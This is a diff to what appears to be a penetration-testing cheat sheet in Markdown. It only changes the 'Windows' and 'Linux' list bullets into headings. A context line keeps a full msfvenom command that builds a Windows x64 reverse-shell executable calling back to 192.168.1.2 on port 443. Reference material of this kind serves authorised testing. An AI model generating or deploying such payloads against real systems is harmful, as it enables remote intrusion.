@@ -67,7 +67,7 @@
 
 * Msfvenom
 
-* Windows
+# Windows
 
 * Meterpreter (Metasploit Listener multi/handler) [Staged]
 
@@ -87,7 +87,7 @@
 
   * x64 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe```
 
-* Linux
+# Linux
 
 * Meterpreter (Metasploit Listener multi/handler) [Staged]
 
